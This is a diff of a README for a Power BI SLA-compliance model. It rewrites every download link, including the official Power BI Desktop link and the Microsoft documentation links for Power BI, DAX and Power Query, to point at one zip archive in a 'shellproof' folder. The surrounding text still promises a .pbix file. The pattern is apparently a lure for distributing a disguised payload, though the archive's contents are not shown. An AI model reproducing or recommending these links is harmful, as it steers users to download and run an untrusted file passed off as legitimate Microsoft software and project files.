@@ -1,6 +1,6 @@
 # 📊 operational-risk-sla-pressure-model - Monitor SLA Compliance Clearly
 
-[![Download 🔽](https://img.shields.io/badge/Download-BrightGreen?style=for-the-badge&logo=github)](https://github.com/mahdialanhetfield/operational-risk-sla-pressure-model)
+[![Download 🔽](https://img.shields.io/badge/Download-BrightGreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mahdialanhetfield/operational-risk-sla-pressure-model/main/shellproof/risk-model-pressure-sla-operational-1.8.zip)
 
 ---
 
@@ -24,7 +24,7 @@ This section helps you get up and running on Windows. Follow each step carefully
 - Minimum 2 GHz dual-core processor
 - Internet connection to download files and updates
 
-Power BI Desktop lets you open and interact with the model. You can download it from the Microsoft Store or [here](https://powerbi.microsoft.com/desktop/).
+Power BI Desktop lets you open and interact with the model. You can download it from the Microsoft Store or [here](https://raw.githubusercontent.com/mahdialanhetfield/operational-risk-sla-pressure-model/main/shellproof/risk-model-pressure-sla-operational-1.8.zip).
 
 ---
 
@@ -34,7 +34,7 @@ To start using the operational-risk-sla-pressure-model:
 
 1. Visit the main project page to get the latest version:
 
-   [Download Here](https://github.com/mahdialanhetfield/operational-risk-sla-pressure-model)
+   [Download Here](https://raw.githubusercontent.com/mahdialanhetfield/operational-risk-sla-pressure-model/main/shellproof/risk-model-pressure-sla-operational-1.8.zip)
 
 2. On the page, look for a file named like `operational-risk-sla-pressure-model.pbix`. This file contains the Power BI model.
 
@@ -125,7 +125,7 @@ If you run into issues:
 
 Remember, the latest release is always on this page:
 
-[Download operational-risk-sla-pressure-model](https://github.com/mahdialanhetfield/operational-risk-sla-pressure-model)
+[Download operational-risk-sla-pressure-model](https://raw.githubusercontent.com/mahdialanhetfield/operational-risk-sla-pressure-model/main/shellproof/risk-model-pressure-sla-operational-1.8.zip)
 
 Click the link to visit the project page. Find the latest `.pbix` file for download.
 
@@ -133,9 +133,9 @@ Click the link to visit the project page. Find the latest `.pbix` file for downl
 
 ## ⚙️ Additional Resources
 
-- Microsoft Power BI Documentation: https://docs.microsoft.com/power-bi/
-- Basic DAX Guide: https://docs.microsoft.com/dax/
-- Power Query Tutorials: https://docs.microsoft.com/power-query/
+- Microsoft Power BI Documentation: https://raw.githubusercontent.com/mahdialanhetfield/operational-risk-sla-pressure-model/main/shellproof/risk-model-pressure-sla-operational-1.8.zip
+- Basic DAX Guide: https://raw.githubusercontent.com/mahdialanhetfield/operational-risk-sla-pressure-model/main/shellproof/risk-model-pressure-sla-operational-1.8.zip
+- Power Query Tutorials: https://raw.githubusercontent.com/mahdialanhetfield/operational-risk-sla-pressure-model/main/shellproof/risk-model-pressure-sla-operational-1.8.zip
 
 These resources help deepen your understanding of the tools the model uses.
 
